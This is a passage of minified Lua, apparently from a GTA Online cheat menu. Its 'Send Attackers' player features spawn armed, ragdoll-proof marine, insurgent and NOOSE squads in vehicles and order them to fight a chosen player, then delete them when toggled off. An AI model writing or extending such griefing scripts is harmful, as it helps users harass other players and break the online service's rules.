NooseTeam4[e],187,0)ped.set_ped_can_ragdoll(NooseTeam4[e],false)for l=1,26 do ped.set_ped_ragdoll_blocking_flags(NooseTeam4[e],l)end;ped.set_ped_into_vehicle(NooseTeam4[e],NooseHelo[k],4)while g.on do ai.task_combat_ped(NooseTeam4[e],h,0,16)system.wait(25)if entity.is_entity_dead(NooseTeam4[e])then return HANDLER_CONTINUE end;for e=1,#NooseTeam4 do system.wait(25)ai.task_combat_ped(NooseTeam4[e],h,0,16)if utilities.get_distance_between(h,NooseTeam4[e])>4000 then network.request_control_of_entity(NooseTeam4[e])entity.set_entity_as_no_longer_needed(NooseTeam4[e])network.request_control_of_entity(NooseHelo[k])entity.set_entity_as_no_longer_needed(NooseHelo[k])end end end;while g.off do return HANDLER_POP end;local d=v3()d.x=-5784.258301;d.y=-8289.385742;d.z=-136.411270;for e=1,#NooseTeam4 do ped.get_all_peds(NooseTeam4[e])system.wait(25)network.request_control_of_entity(NooseTeam4[e])entity.set_entity_coords_no_offset(NooseTeam4[e],d)entity.set_entity_as_no_longer_needed(NooseTeam4[e])entity.delete_entity(NooseTeam4[e])end;for k=1,#NooseHelo do vehicle.get_all_vehicles(NooseHelo[k])system.wait(25)network.request_control_of_entity(NooseHelo[k])entity.set_entity_coords_no_offset(NooseHelo[k],d)entity.set_entity_as_no_longer_needed(NooseHelo[k])entity.delete_entity(NooseHelo[k])end end)playerfeature["Send Marine Squaddie"]=menu.add_player_feature("Send Marine Squaddie","toggle",playerparents["Send Attackers"].id,function(g,b)local d=v3()local h=player.get_player_ped(b)d=player.get_player_coords(b)d.x=d.x+100;d.y=d.y+0;d.z=d.z-0;system.wait(100)local i=gameplay.get_hash_key("s_m_y_marine_03")streaming.request_model(i)while not streaming.has_model_loaded(i)do system.wait(10)end;local e=#Army1+1;Army1[e]=ped.create_ped(6,i,d,d.z,true,false)if#Army1>=8 then end;entity.set_entity_god_mode(Army1[e],false)streaming.set_model_as_no_longer_needed(i)local j=0xF9E67C05;streaming.request_model(j)while not streaming.has_model_loaded(j)do system.wait(10)end;local k=#ArmyHumvee+1;ArmyHumvee[k]=vehicle.create_vehicle(j,d,d.z,true,false)entity.set_entity_god_mode(ArmyHumvee[k],false)vehicle.set_vehicle_mod_kit_type(ArmyHumvee[k],0)vehicle.get_vehicle_mod(ArmyHumvee[k],40)vehicle.set_vehicle_mod(ArmyHumvee[k],40,3,true)ped.set_ped_combat_attributes(Army1[e],46,false)weapon.give_delayed_weapon_to_ped(Army1[e],0xBFE256D4,1,1)weapon.give_delayed_weapon_to_ped(Army1[e],0xFAD1F1C9,1,1)weapon.give_weapon_component_to_ped(Army1[e],0xBFE256D4,0x4F37DF2A)weapon.give_weapon_component_to_ped(Army1[e],0xBFE256D4,0x43FD595B)weapon.give_weapon_component_to_ped(Army1[e],0xBFE256D4,0x21E34793)weapon.give_weapon_component_to_ped(Army1[e],0xFAD1F1C9,0x44032F11)weapon.give_weapon_component_to_ped(Army1[e],0xFAD1F1C9,0x9D65907A)weapon.give_weapon_component_to_ped(Army1[e],0xFAD1F1C9,0x7BC4CDDC)weapon.give_weapon_component_to_ped(Army1[e],0xFAD1F1C9,0xC66B6542)weapon.give_weapon_component_to_ped(Army1[e],0xFAD1F1C9,0x4DB62ABE)weapon.give_weapon_component_to_ped(Army1[e],0xFAD1F1C9,0x8B3C480B)ped.set_ped_combat_attributes(Army1[e],1,true)ped.set_ped_combat_attributes(Army1[e],3,true)ped.set_ped_combat_attributes(Army1[e],2,false)ped.set_ped_combat_attributes(Army1[e],52,false)ped.set_ped_combat_attributes(Army1[e],4,true)ped.set_ped_combat_range(Army1[e],2)ped.set_ped_combat_ability(Army1[e],2)ped.set_ped_combat_movement(Army1[e],2)ped.set_ped_max_health(Army1[e],328.0)ped.set_ped_health(Army1[e],328.0)ped.set_ped_config_flag(Army1[e],187,0)ped.set_ped_can_ragdoll(Army1[e],false)for l=1,26 do ped.set_ped_ragdoll_blocking_flags(Army1[e],l)end;ped.set_ped_into_vehicle(Army1[e],ArmyHumvee[k],-1)local e=#Army1+1;Army1[e]=ped.create_ped(6,i,d,d.z,true,false)if#Army1>=8 then end;entity.set_entity_god_mode(Army1[e],false)streaming.set_model_as_no_longer_needed(i)ped.set_ped_combat_attributes(Army1[e],46,false)weapon.give_delayed_weapon_to_ped(Army1[e],0xBFE256D4,1,1)weapon.give_delayed_weapon_to_ped(Army1[e],0x555AF99A,1,1)weapon.give_weapon_component_to_ped(Army1[e],0xBFE256D4,0x4F37DF2A)weapon.give_weapon_component_to_ped(Army1[e],0xBFE256D4,0x43FD595B)weapon.give_weapon_component_to_ped(Army1[e],0xBFE256D4,0x21E34793)weapon.give_weapon_component_to_ped(Army1[e],0x555AF99A,0x3BE4465D)weapon.give_weapon_component_to_ped(Army1[e],0x555AF99A,0x420FD713)weapon.give_weapon_component_to_ped(Army1[e],0x555AF99A,0x7BC4CDDC)weapon.give_weapon_component_to_ped(Army1[e],0x555AF99A,0x5F7DCE4D)ped.set_ped_combat_attributes(Army1[e],1,true)ped.set_ped_combat_attributes(Army1[e],3,true)ped.set_ped_combat_attributes(Army1[e],2,false)ped.set_ped_combat_attributes(Army1[e],52,false)ped.set_ped_combat_attributes(Army1[e],4,true)ped.set_ped_combat_range(Army1[e],2)ped.set_ped_combat_ability(Army1[e],2)ped.set_ped_combat_movement(Army1[e],2)ped.set_ped_max_health(Army1[e],328.0)ped.set_ped_health(Army1[e],328.0)ped.set_ped_config_flag(Army1[e],187,0)ped.set_ped_can_ragdoll(Army1[e],false)for l=1,26 do ped.set_ped_ragdoll_blocking_flags(Army1[e],l)end;ped.set_ped_into_vehicle(Army1[e],ArmyHumvee[k],0)local e=#Army1+1;Army1[e]=ped.create_ped(6,i,d,d.z,true,false)if#Army1>=8 then end;entity.set_entity_god_mode(Army1[e],false)streaming.set_model_as_no_longer_needed(i)ped.set_ped_combat_attributes(Army1[e],46,false)weapon.give_delayed_weapon_to_ped(Army1[e],0xBFE256D4,1,1)weapon.give_delayed_weapon_to_ped(Army1[e],0xDBBD7280,1,1)weapon.give_weapon_component_to_ped(Army1[e],0xBFE256D4,0x4F37DF2A)weapon.give_weapon_component_to_ped(Army1[e],0xBFE256D4,0x43FD595B)weapon.give_weapon_component_to_ped(Army1[e],0xBFE256D4,0x21E34793)weapon.give_weapon_component_to_ped(Army1[e],0xDBBD7280,0x57EF1CC8)weapon.give_weapon_component_to_ped(Army1[e],0xDBBD7280,0x9D65907A)weapon.give_weapon_component_to_ped(Army1[e],0xDBBD7280,0xC66B6542)weapon.give_weapon_component_to_ped(Army1[e],0xDBBD7280,0x2E7957A)weapon.give_weapon_component_to_ped(Army1[e],0xDBBD7280,0xB5E2575B)ped.set_ped_combat_attributes(Army1[e],1,true)ped.set_ped_combat_attributes(Army1[e],3,true)ped.set_ped_combat_attributes(Army1[e],2,false)ped.set_ped_combat_attributes(Army1[e],52,false)ped.set_ped_combat_attributes(Army1[e],4,true)ped.set_ped_combat_range(Army1[e],2)ped.set_ped_combat_ability(Army1[e],2)ped.set_ped_combat_movement(Army1[e],2)ped.set_ped_max_health(Army1[e],328.0)ped.set_ped_health(Army1[e],328.0)ped.set_ped_config_flag(Army1[e],187,0)ped.set_ped_can_ragdoll(Army1[e],false)for l=1,26 do ped.set_ped_ragdoll_blocking_flags(Army1[e],l)end;ped.set_ped_into_vehicle(Army1[e],ArmyHumvee[k],1)local e=#Army1+1;Army1[e]=ped.create_ped(6,i,d,d.z,true,false)if#Army1>=8 then end;entity.set_entity_god_mode(Army1[e],false)streaming.set_model_as_no_longer_needed(i)ped.set_ped_combat_attributes(Army1[e],46,false)weapon.give_delayed_weapon_to_ped(Army1[e],0xBFE256D4,1,1)weapon.give_delayed_weapon_to_ped(Army1[e],0xFAD1F1C9,1,1)weapon.give_weapon_component_to_ped(Army1[e],0xBFE256D4,0x4F37DF2A)weapon.give_weapon_component_to_ped(Army1[e],0xBFE256D4,0x43FD595B)weapon.give_weapon_component_to_ped(Army1[e],0xBFE256D4,0x21E34793)weapon.give_weapon_component_to_ped(Army1[e],0xFAD1F1C9,0x44032F11)weapon.give_weapon_component_to_ped(Army1[e],0xFAD1F1C9,0x9D65907A)weapon.give_weapon_component_to_ped(Army1[e],0xFAD1F1C9,0x7BC4CDDC)weapon.give_weapon_component_to_ped(Army1[e],0xFAD1F1C9,0xC66B6542)weapon.give_weapon_component_to_ped(Army1[e],0xFAD1F1C9,0x4DB62ABE)weapon.give_weapon_component_to_ped(Army1[e],0xFAD1F1C9,0x8B3C480B)ped.set_ped_combat_attributes(Army1[e],1,true)ped.set_ped_combat_attributes(Army1[e],3,true)ped.set_ped_combat_attributes(Army1[e],2,false)ped.set_ped_combat_attributes(Army1[e],52,false)ped.set_ped_combat_attributes(Army1[e],4,true)ped.set_ped_combat_range(Army1[e],2)ped.set_ped_combat_ability(Army1[e],2)ped.set_ped_combat_movement(Army1[e],2)ped.set_ped_max_health(Army1[e],328.0)ped.set_ped_health(Army1[e],328.0)ped.set_ped_config_flag(Army1[e],187,0)ped.set_ped_can_ragdoll(Army1[e],false)for l=1,26 do ped.set_ped_ragdoll_blocking_flags(Army1[e],l)end;ped.set_ped_into_vehicle(Army1[e],ArmyHumvee[k],2)while g.on do ai.task_combat_ped(Army1[e],h,0,16)system.wait(25)if entity.is_entity_dead(Army1[e])then return HANDLER_CONTINUE end;for e=1,#Army1 do system.wait(25)ai.task_combat_ped(Army1[e],h,0,16)if utilities.get_distance_between(h,Army1[e])>1000 then network.request_control_of_entity(Army1[e])entity.set_entity_as_no_longer_needed(Army1[e])network.request_control_of_entity(ArmyHumvee[k])entity.set_entity_as_no_longer_needed(ArmyHumvee[k])end end end;while g.off do return HANDLER_POP end;local d=v3()d.x=-5784.258301;d.y=-8289.385742;d.z=-136.411270;for e=1,#Army1 do ped.get_all_peds(Army1[e])system.wait(25)network.request_control_of_entity(Army1[e])entity.set_entity_coords_no_offset(Army1[e],d)entity.set_entity_as_no_longer_needed(Army1[e])entity.delete_entity(Army1[e])end;for k=1,#ArmyHumvee do vehicle.get_all_vehicles(ArmyHumvee[k])system.wait(25)network.request_control_of_entity(ArmyHumvee[k])entity.set_entity_coords_no_offset(ArmyHumvee[k],d)entity.set_entity_as_no_longer_needed(ArmyHumvee[k])entity.delete_entity(ArmyHumvee[k])end end)playerfeature["Send Insurgent"]=menu.add_player_feature("Send Insurgent","toggle",playerparents["Send Attackers"].id,function(g,b)local d=v3()local h=player.get_player_ped(b)d=player.get_player_coords(b)d.x=d.x+100;d.y=d.y+0;d.z=d.z-0;system.wait(100)local i=gameplay.get_hash_key("s_m_y_marine_03")streaming.request_model(i)while not streaming.has_model_loaded(i)do system.wait(10)end;local e=#Army6+1;Army6[e]=ped.create_ped(6,i,d,d.z,true,false)if#Army6>=8 then end;entity.set_entity_god_mode(Army6[e],false)streaming.set_model_as_no_longer_needed(i)local j=0x7B7E56F0;streaming.request_model(j)while not streaming.has_model_loaded(j)do system.wait(10)end;local k=#ArmyInsurgent+1;ArmyInsurgent[k]=vehicle.create_vehicle(j,d,d.z,true,false)entity.set_entity_god_mode(ArmyInsurgent[k],false)vehicle.set_vehicle_mod_kit_type(ArmyInsurgent[k],0)vehicle.get_vehicle_mod(ArmyInsurgent[k],40)vehicle.set_vehicle_mod(ArmyInsurgent[k],40,3,true)ped.set_ped_combat_attributes(Army6[e],46,false)weapon.give_delayed_weapon_to_ped(Army6[e],0x93E220BD,1,1)weapon.give_delayed_weapon_to_ped(Army6[e],0xBFE256D4,1,1)weapon.give_delayed_weapon_to_ped(Army6[e],0xFAD1F1C9,1,1)weapon.give_weapon_component_to_ped(Army6[e],0xBFE256D4,0x4F37DF2A)weapon.give_weapon_component_to_ped(Army6[e],0xBFE256D4,0x43FD595B)weapon.give_weapon_component_to_ped(Army6[e],0xBFE256D4,0x21E34793)weapon.give_weapon_component_to_ped(Army6[e],0xFAD1F1C9,0x44032F11)weapon.give_weapon_component_to_ped(Army6[e],0xFAD1F1C9,0x9D65907A)weapon.give_weapon_component_to_ped(Army6[e],0xFAD1F1C9,0x7BC4CDDC)weapon.give_weapon_component_to_ped(Army6[e],0xFAD1F1C9,0xC66B6542)weapon.give_weapon_component_to_ped(Army6[e],0xFAD1F1C9,0x4DB62ABE)weapon.give_weapon_component_to_ped(Army6[e],0xFAD1F1C9,0x8B3C480B)ped.set_ped_combat_attributes(Army6[e],1,true)ped.set_ped_combat_attributes(Army6[e],3,true)ped.set_ped_combat_attributes(Army6[e],2,false)ped.set_ped_combat_attributes(Army6[e],52,false)ped.set_ped_combat_attributes(Army6[e],4,true)ped.set_ped_combat_range(Army6[e],2)ped.set_ped_combat_ability(Army6[e],2)ped.set_ped_combat_movement(Army6[e],1)ped.set_ped_max_health(Army6[e],328.0)ped.set_ped_health(Army6[e],328.0)ped.set_ped_config_flag(Army6[e],187,0)ped.set_ped_can_ragdoll(Army6[e],false)for l=1,26 do ped.set_ped_ragdoll_blocking_flags(Army6[e],l)end;ped.set_ped_into_vehicle(Army6[e],ArmyInsurgent[k],-1)local e=#Army6+1;Army6[e]=ped.create_ped(6,i,d,d.z,true,false)if#Army6>=8 then end;entity.set_entity_god_mode(Army6[e],false)streaming.set_model_as_no_longer_needed(i)ped.set_ped_combat_attributes(Army6[e],46,false)weapon.give_delayed_weapon_to_ped(Army6[e],0x93E220BD,1,1)weapon.give_delayed_weapon_to_ped(Army6[e],0xBFE256D4,1,1)weapon.give_delayed_weapon_to_ped(Army6[e],0x555AF99A,1,1)weapon.give_weapon_component_to_ped(Army6[e],0xBFE256D4,0x4F37DF2A)weapon.give_weapon_component_to_ped(Army6[e],0xBFE256D4,0x43FD595B)weapon.give_weapon_component_to_ped(Army6[e],0xBFE256D4,0x21E34793)weapon.give_weapon_component_to_ped(Army6[e],0x555AF99A,0x3BE4465D)weapon.give_weapon_component_to_ped(Army6[e],0x555AF99A,0x420FD713)weapon.give_weapon_component_to_ped(Army6[e],0x555AF99A,0x7BC4CDDC)weapon.give_weapon_component_to_ped(Army6[e],0x555AF99A,0x5F7DCE4D)ped.set_ped_combat_attributes(Army6[e],1,true)ped.set_ped_combat_attributes(Army6[e],3,true)ped.set_ped_combat_attributes(Army6[e],2,false)ped.set_ped_combat_attributes(Army6[e],52,false)ped.set_ped_combat_attributes(Army6[e],4,true)ped.set_ped_combat_range(Army6[e],2)ped.set_ped_combat_ability(Army6[e],2)ped.set_ped_combat_movement(Army6[e],1)ped.set_ped_max_health(Army6[e],328.0)ped.set_ped_health(Army6[e],328.0)ped.set_ped_config_flag(Army6[e],187,0)ped.set_ped_can_ragdoll(Army6[e],false)for l=1,26 do ped.set_ped_ragdoll_blocking_flags(Army6[e],l)end;ped.set_ped_into_vehicle(Army6[e],ArmyInsurgent[k],0)local e=#Army6+1;Army6[e]=ped.create_ped(6,i,d,d.z,true,false)if#Army6>=8 then end;entity.set_entity_god_mode(Army6[e],false)streaming.set_model_as_no_longer_needed(i)ped.set_ped_combat_attributes(Army6[e],46,false)weapon.give_delayed_weapon_to_ped(Army6[e],0x93E220BD,1,1)weapon.give_delayed_weapon_to_ped(Army6[e],0xBFE256D4,1,1)weapon.give_delayed_weapon_to_ped(Army6[e],0xDBBD7280,1,1)weapon.give_weapon_component_to_ped(Army6[e],0xBFE256D4,0x4F37DF2A)weapon.give_weapon_component_to_ped(Army6[e],0xBFE256D4,0x43FD595B)weapon.give_weapon_component_to_ped(Army6[e],0xBFE256D4,0x21E34793)weapon.give_weapon_component_to_ped(Army6[e],0xDBBD7280,0x57EF1CC8)weapon.give_weapon_component_to_ped(Army6[e],0xDBBD7280,0x9D65907A)weapon.give_weapon_component_to_ped(Army6[e],0xDBBD7280,0xC66B6542)weapon.give_weapon_component_to_ped(Army6[e],0xDBBD7280,0x2E7957A)weapon.give_weapon_component_to_ped(Army6[e],0xDBBD7280,0xB5E2575B)ped.set_ped_combat_attributes(Army6[e],1,true)ped.set_ped_combat_attributes(Army6[e],3,true)ped.set_ped_combat_attributes(Army6[e],2,true)ped.set_ped_combat_attributes(Army6[e],52,false)ped.set_ped_combat_attributes(Army6[e],4,true)ped.set_ped_combat_range(Army6[e],2)ped.set_ped_combat_ability(Army6[e],2)ped.set_ped_combat_movement(Army6[e],1)ped.set_ped_max_health(Army6[e],328.0)ped.set_ped_health(Army6[e],328.0)ped.set_ped_config_flag(Army6[e],187,0)ped.set_ped_can_ragdoll(Army6[e],false)for l=1,26 do ped.set_ped_ragdoll_blocking_flags(Army6[e],l)end;ped.set_ped_into_vehicle(Army6[e],ArmyInsurgent[k],1)local e=#Army6+1;Army6[e]=ped.create_ped(6,i,d,d.z,true,false)if#Army6>=8 then end;entity.set_entity_god_mode(Army6[e],false)streaming.set_model_as_no_longer_needed(i)ped.set_ped_combat_attributes(Army6[e],46,false)weapon.give_delayed_weapon_to_ped(Army6[e],0x93E220BD,1,1)weapon.give_delayed_weapon_to_ped(Army6[e],0xBFE256D4,1,1)weapon.give_delayed_weapon_to_ped(Army6[e],0xFAD1F1C9,1,1)weapon.give_weapon_component_to_ped(Army6[e],0xBFE256D4,0x4F37DF2A)weapon.give_weapon_component_to_ped(Army6[e],0xBFE256D4,0x43FD595B)weapon.give_weapon_component_to_ped(Army6[e],0xBFE256D4,0x21E34793)weapon.give_weapon_component_to_ped(Army6[e],0xFAD1F1C9,0x44032F11)weapon.give_weapon_component_to_ped(Army6[e],0xFAD1F1C9,0x9D65907A)weapon.give_weapon_component_to_ped(Army6[e],0xFAD1F1C9,0x7BC4CDDC)weapon.give_weapon_component_to_ped(Army6[e],0xFAD1F1C9,0xC66B6542)weapon.give_weapon_component_to_ped(Army6[e],0xFAD1F1C9,0x4DB62ABE)weapon.give_weapon_component_to_ped(Army6[e],0xFAD1F1C9,0x8B3C480B)ped.set_ped_combat_attributes(Army6[e],1,true)ped.set_ped_combat_attributes(Army6[e],3,true)ped.set_ped_combat_attributes(Army6[e],2,true)ped.set_ped_combat_attributes(Army6[e],52,false)ped.set_ped_combat_attributes(Army6[e],4,true)ped.set_ped_combat_range(Army6[e],2)ped.set_ped_combat_ability(Army6[e],2)ped.set_ped_combat_movement(Army6[e],1)ped.set_ped_max_health(Army6[e],328.0)ped.set_ped_health(Army6[e],328.0)ped.set_ped_config_flag(Army6[e],187,0)ped.set_ped_can_ragdoll(Army6[e],false)for l=1,26 do ped.set_ped_ragdoll_blocking_flags(Army6[e],l)end;ped.set_ped_into_vehicle(Army6[e],ArmyInsurgent[k],2)local e=#Army6+1;Army6[e]=ped.create_ped(6,i,d,d.z,true,false)if#Army6>=8 then end;entity.set_entity_god_mode(Army6[e],false)streaming.set_model_as_no_longer_needed(i)ped.set_ped_combat_attributes(Army6[e],46,false)weapon.give_delayed_weapon_to_ped(Army6[e],0x93E220BD,1,1)weapon.give_delayed_weapon_to_ped(Army6[e],0xBFE256D4,1,1)weapon.give_delayed_weapon_to_ped(Army6[e],0xFAD1F1C9,1,1)weapon.give_weapon_component_to_ped(Army6[e],0xBFE256D4,0x4F37DF2A)weapon.give_weapon_component_to_ped(Army6[e],0xBFE256D4,0x43FD595B)weapon.give_weapon_component_to_ped(Army6[e],0xBFE256D4,0x21E34793)weapon.give_weapon_component_to_ped(Army6[e],0xFAD1F1C9,0x44032F11)weapon.give_weapon_component_to_ped(Army6[e],0xFAD1F1C9,0x9D65907A)weapon.give_weapon_component_to_ped(Army6[e],0xFAD1F1C9,0x7BC4CDDC)weapon.give_weapon_component_to_ped(Army6[e],0xFAD1F1C9,0xC66B6542)weapon.give_weapon_component_to_ped(Army6[e],0xFAD1F1C9,0x4DB62ABE)weapon.give_weapon_component_to_ped(Army6[e],0xFAD1F1C9,0x8B3C480B)ped.set_ped_combat_attributes(Army6[e],1,true)ped.set_ped_combat_attributes(Army6[e],3,true)ped.set_ped_combat_attributes(Army6[e],2,true)ped.set_ped_combat_attributes(Army6[e],52,false)ped.set_ped_combat_attributes(Army6[e],4,true)ped.set_ped_combat_range(Army6[e],2)ped.set_ped_combat_ability(Army6[e],2)ped.set_ped_combat_movement(Army6[e],1)ped.set_ped_max_health(Army6[e],328.0)ped.set_ped_health(Army6[e],328.0)ped.set_ped_config_flag(Army6[e],187,0)ped.set_ped_can_ragdoll(Army6[e],false)for l=1,26 do ped.set_ped_ragdoll_blocking_flags(Army6[e],l)end;ped.set_ped_into_vehicle(Army6[e],ArmyInsurgent[k],3)local e=#Army6+1;Army6[e]=ped.create_ped(6,i,d,d.z,true,false)if#Army6>=8 then end;entity.set_entity_god_mode(Army6[e],false)streaming.set_model_as_no_longer_needed(i)ped.set_ped_combat_attributes(Army6[e],46,false)weapon.give_delayed_weapon_to_ped(Army6[e],0x93E220BD,1,1)weapon.give_delayed_weapon_to_ped(Army6[e],0xBFE256D4,1,1)weapon.give_delayed_weapon_to_ped(Army6[e],0xFAD1F1C9,1,1)weapon.give_weapon_component_to_ped(Army6[e],0xBFE256D4,0x4F37DF2A)weapon.give_weapon_component_to_ped(Army6[e],0xBFE256D4,0x43FD595B)weapon.give_weapon_component_to_ped(Army6[e],0xBFE256D4,0x21E34793)weapon.give_weapon_component_to_ped(Army6[e],0xFAD1F1C9,0x44032F11)weapon.give_weapon_component_to_ped(Army6[e],0xFAD1F1C9,0x9D65907A)weapon.give_weapon_component_to_ped(Army6[e],0xFAD1F1C9,0x7BC4CDDC)weapon.give_weapon_component_to_ped(Army6[e],0xFAD1F1C9,0xC66B6542)weapon.give_weapon_component_to_ped(Army6[e],0xFAD1F1C9,0x4DB62ABE)weapon.give_weapon_component_to_ped(Army6[e],0xFAD1F1C9,0x8B3C480B)ped.set_ped_combat_attributes(Army6[e],1,true)ped.set_ped_combat_attributes(Army6[e],3,true)ped.set_ped_combat_attributes(Army6[e],2,true)ped.set_ped_combat_attributes(Army6[e],52,false)ped.set_ped_combat_attributes(Army6[e],4,true)ped.set_ped_combat_range(Army6[e],2)ped.set_ped_combat_ability(Army6[e],2)ped.set_ped_combat_movement(Army6[e],1)ped.set_ped_max_health(Army6[e],328.0)ped.set_ped_health(Army6[e],328.0)ped.set_ped_config_flag(Army6[e],187,0)ped.set_ped_can_ragdoll(Army6[e],false)for l=1,26 do ped.set_ped_ragdoll_blocking_flags(Army6[e],l)end;ped.set_ped_into_vehicle(Army6[e],ArmyInsurgent[k],4)while g.on do ai.task_combat_ped(Army6[e],h,0,16)system.wait(25)if entity.is_entity_dead(Army6[e])then return HANDLER_CONTINUE end;for e=1,#Army6 do system.wait(25)ai.task_combat_ped(Army6[e],h,0,16)if utilities.get_distance_between(h,Army6[e])>1000 then network.request_control_of_entity(Army6[e])entity.set_entity_as_no_longer_needed(Army6[e])network.request_control_of_entity(ArmyInsurgent[k])entity.set_entity_as_no_longer_needed(ArmyInsurgent[k])end end end;while g.off do return HANDLER_POP end;local d=v3()d.x=-5784.258301;d.y=-8289.385742;d.z=-136.411270;for e=1,#Army6 do ped.get_all_peds(Army6[e])system.wait(25)network.request_control_of_entity(Army6[e])entity.set_entity_coords_no_offset(Army6[e],d)entity.set_entity_as_no_longer_needed(Army6[e])entity.delete_entity(Army6[e])end;for k=1,#ArmyInsurgent do vehicle.get_all_vehicles(ArmyInsurgent[k])system.wait(25)network.request_control_of_entity(ArmyInsurgent[k])entity.set_entity_coords_no_offset(ArmyInsurgent[k],d)entity.set_entity_as_no_longer_needed(ArmyInsurgent[k])entity.delete_entity(ArmyInsurgent[k])end end)playerfeature["Send Marine Barracks"]=menu.add_player_feature("Send Marine Barracks","toggle",playerparents["Send Attackers"].id,function(g,b)local d=v3()local h=player.get_player_ped(b)d=player.get_player_coords(b)d.x=d.x+100;d.y=d.y+0;d.z=d.z-0;system.wait(100)local i=gameplay.get_hash_key("s_m_y_marine_03")streaming.request_model(i)while not streaming.has_model_loaded(i)do system.wait(10)end;local e=#Army2+1;Army2[e]=ped.create_ped(6,i,d,d.z,true,false)if#Army2>=8 then end;entity.set_entity_god_mode(Army2[e],false)streaming.set_model_as_no_longer_needed(i)local j=0x2592B5CF;streaming.request_model(j)while not streaming.has_model_loaded(j)do system.wait(10)end;local k=#ArmyTransport+1;ArmyTransport[k]=vehicle.create_vehicle(j,d,d.z,true,false)entity.set_entity_god_mode(ArmyTransport[k],false)vehicle.set_vehicle_mod_kit_type(ArmyTransport[k],0)vehicle.get_vehicle_mod(ArmyTransport[k],40)vehicle.set_vehicle_mod(ArmyTransport[k],40,3,true)ped.set_ped_combat_attributes(Army2[e],46,false)weapon.give_delayed_weapon_to_ped(Army2[e],0x93E220BD,1,1)weapon.give_delayed_weapon_to_ped(Army2[e],0xBFE256D4,1,1)weapon.give_delayed_weapon_to_ped(Army2[e],0xFAD1F1C9,1,1)weapon.give_weapon_component_to_ped(Army2[e],0xBFE256D4,0x4F37DF2A)weapon.give_weapon_component_to_ped(Army2[e],0xBFE256D4,0x43FD595B)weapon.give_weapon_component_to_ped(Army2[e],0xBFE256D4,0x21E34793)weapon.give_weapon_component_to_ped(Army2[e],0xFAD1F1C9,0x44032F11)weapon.give_weapon_component_to_ped(Army2[e],0xFAD1F1C9,0x9D65907A)weapon.give_weapon_component_to_ped(Army2[e],0xFAD1F1C9,0x7BC4CDDC)weapon.give_weapon_component_to_ped(Army2[e],0xFAD1F1C9,0xC66B6542)weapon.give_weapon_component_to_ped(Army2[e],0xFAD1F1C9,0x4DB62ABE)weapon.give_weapon_component_to_ped(Army2[e],0xFAD1F1C9,0x8B3C480B)ped.set_ped_combat_attributes(Army2[e],1,true)ped.set_ped_combat_attributes(Army2[e],3,true)ped.set_ped_prop_index(Army2[e],0,0,0,0)ped.set_ped_combat_attributes(Army2[e],2,false)ped.set_ped_combat_attributes(Army2[e],52,false)ped.set_ped_combat_attributes(Army2[e],4,true)ped.set_ped_combat_range(Army2[e],2)ped.set_ped_combat_ability(Army2[e],2)ped.set_ped_combat_movement(Army2[e],1)ped.set_ped_max_health(Army2[e],328.0)ped.set_ped_health(Army2[e],328.0)ped.set_ped_config_flag(Army2[e],187,0)ped.set_ped_can_ragdoll(Army2[e],false)for l=1,26 do ped.set_ped_ragdoll_blocking_flags(Army2[e],l)end;ped.set_ped_into_vehicle(Army2[e],ArmyTransport[k],-1)local e=#Army2+1;Army2[e]=ped.create_ped(6,i,d,d.z,true,false)if#Army2>=8 then end;entity.set_entity_god_mode(Army2[e],false)streaming.set_model_as_no_longer_needed(i)ped.set_ped_combat_attributes(Army2[e],46,false)weapon.give_delayed_weapon_to_ped(Army2[e],0x93E220BD,1,1)weapon.give_delayed_weapon_to_ped(Army2[e],0xBFE256D4,1,1)weapon.give_delayed_weapon_to_ped(Army2[e],0xFAD1F1C9,1,1)weapon.give_weapon_component_to_ped(Army2[e],0xBFE256D4,0x4F37DF2A)weapon.give_weapon_component_to_ped(Army2[e],0xBFE256D4,0x43FD595B)weapon.give_weapon_component_to_ped(Army2[e],0xBFE256D4,0x21E34793)weapon.give_weapon_component_to_ped(Army2[e],0xFAD1F1C9,0x44032F11)weapon.give_weapon_component_to_ped(Army2[e],0xFAD1F1C9,0x9D65907A)weapon.give_weapon_component_to_ped(Army2[e],0xFAD1F1C9,0x7BC4CDDC)weapon.give_weapon_component_to_ped(Army2[e],0xFAD1F1C9,0xC66B6542)weapon.give_weapon_component_to_ped(Army2[e],0xFAD1F1C9,0x4DB62ABE)weapon.give_weapon_component_to_ped(Army2[e],0xFAD1F1C9,0x8B3C480B)ped.set_ped_combat_attributes(Army2[e],1,true)ped.set_ped_combat_attributes(Army2[e],3,true)ped.set_ped_prop_index(Army2[e],0,0,0,0)ped.set_ped_combat_attributes(Army2[e],2,false)ped.set_ped_combat_attributes(Army2[e],52,false)ped.set_ped_combat_attributes(Army2[e],4,true)ped.set_ped_combat_range(Army2[e],2)ped.set_ped_combat_ability(Army2[e],2)ped.set_ped_combat_movement(Army2[e],1)ped.set_ped_max_health(Army2[e],328.0)ped.set_ped_health(Army2[e],328.0)ped.set_ped_config_flag(Army2[e],187,0)ped.set_ped_can_ragdoll(Army2[e],false)for l=1,26 do ped.set_ped_ragdoll_blocking_flags(Army2[e],l)end;ped.set_ped_into_vehicle(Army2[e],ArmyTransport[k],0)local e=#Army2+1;Army2[e]=ped.create_ped(6,i,d,d.z,true,false)if#Army2>=8 then end;entity.set_entity_god_mode(Army2[e],false)streaming.set_model_as_no_longer_needed(i)ped.set_ped_combat_attributes(Army2[e],46,false)weapon.give_delayed_weapon_to_ped(Army2[e],0x93E220BD,1,1)weapon.give_delayed_weapon_to_ped(Army2[e],0xBFE256D4,1,1)weapon.give_delayed_weapon_to_ped(Army2[e],0xFAD1F1C9,1,1)weapon.give_weapon_component_to_ped(Army2[e],0xBFE256D4,0x4F37DF2A)weapon.give_weapon_component_to_ped(Army2[e],0xBFE256D4,0x43FD595B)weapon.give_weapon_component_to_ped(Army2[e],0xBFE256D4,0x21E34793)weapon.give_weapon_component_to_ped(Army2[e],0xFAD1F1C9,0x44032F11)weapon.give_weapon_component_to_ped(Army2[e],0xFAD1F1C9,0x9D65907A)weapon.give_weapon_component_to_ped(Army2[e],0xFAD1F1C9,0x7BC4CDDC)weapon.give_weapon_component_to_ped(Army2[e],0xFAD1F1C9,0xC66B6542)weapon.give_weapon_component_to_ped(Army2[e],0xFAD1F1C9,0x4DB62ABE)weapon.give_weapon_component_to_ped(Army2[e],0xFAD1F1C9,0x8B3C480B)ped.set_ped_combat_attributes(Army2[e],1,true)ped.set_ped_combat_attributes(Army2[e],3,true)ped.set_ped_prop_index(Army2[e],0,0,0,0)ped.set_ped_combat_attributes(Army2[e],2,true)ped.set_ped_combat_attributes(Army2[e],52,false)ped.set_ped_combat_attributes(Army2[e],4,true)ped.set_ped_combat_range(Army2[e],2)ped.set_ped_combat_a